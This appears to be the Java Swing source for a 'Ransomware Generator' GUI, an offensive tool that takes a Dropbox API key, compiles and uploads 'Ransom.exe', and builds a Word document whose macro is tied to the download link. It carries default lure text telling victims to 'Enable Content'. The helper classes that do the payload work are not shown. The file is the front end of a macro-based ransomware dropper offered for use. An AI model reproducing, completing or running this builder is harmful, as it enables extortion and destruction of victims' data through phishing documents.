import javax.swing.*;
import javax.swing.border.*;
import javax.swing.plaf.basic.BasicScrollBarUI;
import java.awt.*;
import java.awt.event.*;

public class Application {
    public static void main(String[] args) {
        try {
            UIManager.setLookAndFeel(UIManager.getSystemLookAndFeelClassName());
        } catch (Exception e) {
            e.printStackTrace();
        }

        JFrame frame = new JFrame("Ransomware Generator");
        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        frame.setExtendedState(JFrame.MAXIMIZED_BOTH);
        frame.getContentPane().setBackground(new Color(18, 18, 18));
        frame.setLayout(new BorderLayout());

        // ===== Title Panel =====
        JPanel titlePanel = new JPanel(new FlowLayout(FlowLayout.CENTER));
        titlePanel.setBackground(new Color(24, 24, 24));
        titlePanel.setBorder(BorderFactory.createMatteBorder(0, 0, 1, 0, new Color(40, 40, 40)));
        ImageIcon icon = new ImageIcon(Application.class.getResource("/icon.png"));

        // put the icon into a JLabel
        JLabel iconLabel = new JLabel(icon);
        iconLabel.setForeground(new Color(220, 53, 69));
        iconLabel.setFont(new Font("Segoe UI", Font.BOLD, 24));

        
        JLabel titleLabel = new JLabel("Ransom Generator", SwingConstants.CENTER);
        titleLabel.setFont(new Font("Segoe UI", Font.BOLD, 38));
        titleLabel.setForeground(new Color(220, 53, 69));
        titleLabel.setBorder(BorderFactory.createEmptyBorder(30, 15, 30, 0));
        
        titlePanel.add(iconLabel);
        titlePanel.add(titleLabel);
        frame.add(titlePanel, BorderLayout.NORTH);

        // ===== Center Panel =====
        JPanel centerPanel = new JPanel(new GridBagLayout());
        centerPanel.setBackground(new Color(18, 18, 18));
        centerPanel.setBorder(BorderFactory.createEmptyBorder(30, 30, 30, 30));
        GridBagConstraints gbc = new GridBagConstraints();
        gbc.insets = new Insets(15, 15, 15, 15);

        // Common rounded border for other components
        Border roundedBorder = BorderFactory.createCompoundBorder(
            new LineBorder(new Color(40, 40, 40), 1, true),
            BorderFactory.createEmptyBorder(1, 1, 1, 1)
        );

        // ADJUSTED DIMENSIONS:
        Dimension apiFieldSize = new Dimension(600, 45);
        Dimension buttonSize = new Dimension(250, 45);
        Dimension htmlAreaSize = new Dimension(600, 450);
        Dimension processAreaSize = new Dimension(300, 450);

        // --- Row 0: API Label ---
        JLabel apiLabel = new JLabel("Enter DropBox API Key");
        styleLabel(apiLabel);
        gbc.gridx = 0; gbc.gridy = 0;
        gbc.anchor = GridBagConstraints.WEST;
        gbc.gridwidth = 2;
        centerPanel.add(apiLabel, gbc);

        // --- Row 1: API Field + Button ---
        JTextField apiField = new JTextField();
        apiField.setPreferredSize(apiFieldSize);
        // 1px white rounded border on all sides:
        Border whiteBorder = BorderFactory.createLineBorder(Color.WHITE, 1, true);
        apiField.setBorder(whiteBorder);
        styleField(apiField, whiteBorder);
        gbc.gridx = 0; gbc.gridy = 1;
        gbc.gridwidth = 1;
        gbc.fill = GridBagConstraints.HORIZONTAL;
        centerPanel.add(apiField, gbc);

        JButton generateButton = new JButton("Generate Word File");
        generateButton.setPreferredSize(buttonSize);
        styleButton(generateButton);
        // hover effect: red on enter, black on exit
        generateButton.addMouseListener(new MouseAdapter() {
            public void mouseEntered(MouseEvent e) {
                generateButton.setBackground(new Color(220, 53, 69));
            }
            public void mouseExited(MouseEvent e) {
                generateButton.setBackground(new Color(0, 0, 0));
            }
        });
        gbc.gridx = 1; gbc.gridy = 1;
        gbc.fill = GridBagConstraints.NONE;
        centerPanel.add(generateButton, gbc);

        // --- Row 2: HTML Label ---
        JLabel htmlLabel = new JLabel("Enter Content of File in HTML form");
        styleLabel(htmlLabel);
        gbc.gridx = 0; gbc.gridy = 2;
        gbc.gridwidth = 2;
        gbc.anchor = GridBagConstraints.WEST;
        centerPanel.add(htmlLabel, gbc);

        // --- Row 3: HTML TextArea (left) ---
        JTextArea htmlArea = new JTextArea();
        htmlArea.setLineWrap(true);
        htmlArea.setWrapStyleWord(true);
        styleTextArea(htmlArea);
        JScrollPane htmlScroll = new JScrollPane(htmlArea);
        htmlScroll.setPreferredSize(htmlAreaSize);
        htmlScroll.setBorder(roundedBorder);
        gbc.gridx = 0; gbc.gridy = 3;
        gbc.gridwidth = 1;
        gbc.weightx = 0.7;
        gbc.weighty = 1.0;
        gbc.fill = GridBagConstraints.BOTH;
        centerPanel.add(htmlScroll, gbc);

        htmlArea.setText(
        "<!DOCTYPE html>\n" +
        "<html>\n"+
        "  <body>\n" +
        "    <h1>Protected Content</h1>\n" +
        "    <p>Click <b>Enable Content</b> in above yellow line to see full content</p>\n" +
        "  </body>\n" +
        "</html>"
);

        // --- Row 3: Process Update (right) ---
        JTextArea processArea = new JTextArea("Ready to process...");
        processArea.setEditable(false);
        styleTextArea(processArea);
        processArea.setFont(new Font("JetBrains Mono", Font.PLAIN, 14));
        processArea.setForeground(new Color(0,255,0));
        JScrollPane processScroll = new JScrollPane(processArea);
        processScroll.setPreferredSize(processAreaSize);
        processScroll.setBorder(roundedBorder);
        gbc.gridx = 1; gbc.gridy = 3;
        gbc.weightx = 0.3;
        gbc.fill = GridBagConstraints.BOTH;
        centerPanel.add(processScroll, gbc);

        frame.add(centerPanel, BorderLayout.CENTER);
        frame.setVisible(true);

        // === Button Logic ===
        generateButton.addActionListener((ActionEvent e) -> {
            generateButton.setEnabled(false);
            processArea.setText("Process started...\n");
            new Thread(() -> {
                try {
                    String html = htmlArea.getText();
                    String ACCESS_TOKEN = apiField.getText();
                    if (ACCESS_TOKEN.trim().isEmpty()) {
                        throw new Exception("API Key cannot be empty");
                    }

                    Thread.sleep(1000);
                    processArea.append("Compiling...\n");
                    Converter.convert();
                    Thread.sleep(1000);
                    processArea.append("Compilation completed.\n");

                    Thread.sleep(1000);
                    processArea.append("Uploading Ransom.exe...\n");
                    String link = Uploader.upload("Ransom.exe", ACCESS_TOKEN);
                    Thread.sleep(1000);
                    processArea.append("Upload completed. Link: " + link + "\n");

                    Thread.sleep(1000);
                    processArea.append("Creating Word file...\n");
                    Thread.sleep(1000);
                    WordVbaAutomation.createWordWithMacro(link, html);
                    processArea.append("Word document created successfully.\nDone.\n");
                } catch (Exception ex) {
                    processArea.append("Error occurred: " + ex.getMessage() + "\n");
                } finally {
                    SwingUtilities.invokeLater(() -> generateButton.setEnabled(true));
                }
            }).start();
        });
    }

    private static void styleLabel(JLabel label) {
        label.setForeground(new Color(200, 200, 200));
        label.setFont(new Font("Segoe UI", Font.BOLD, 16));
    }

    private static void styleField(JTextField field, Border border) {
        field.setBackground(new Color(30, 30, 30));
        field.setForeground(new Color(220, 220, 220));
        field.setCaretColor(Color.WHITE);
        field.setFont(new Font("JetBrains Mono", Font.PLAIN, 14));
        field.setBorder(border);
        field.setSelectionColor(new Color(220, 53, 69));
    }

    private static void styleTextArea(JTextArea area) {
        area.setBackground(new Color(30, 30, 30));
        area.setForeground(new Color(220, 220, 220));
        area.setCaretColor(Color.WHITE);
        area.setFont(new Font("JetBrains Mono", Font.PLAIN, 14));
        area.setSelectionColor(new Color(220, 53, 69));
    }

    private static void styleButton(JButton button) {
        button.setOpaque(true);
        button.setContentAreaFilled(true);
        button.setBackground(new Color(0, 0, 0));  // black
        button.setForeground(Color.BLACK);
        button.setFocusPainted(false);
        button.setFont(new Font("Segoe UI", Font.BOLD, 16));
        button.setBorder(new LineBorder(new Color(80, 80, 80), 2, true));
        button.setCursor(new Cursor(Cursor.HAND_CURSOR));
    }
}
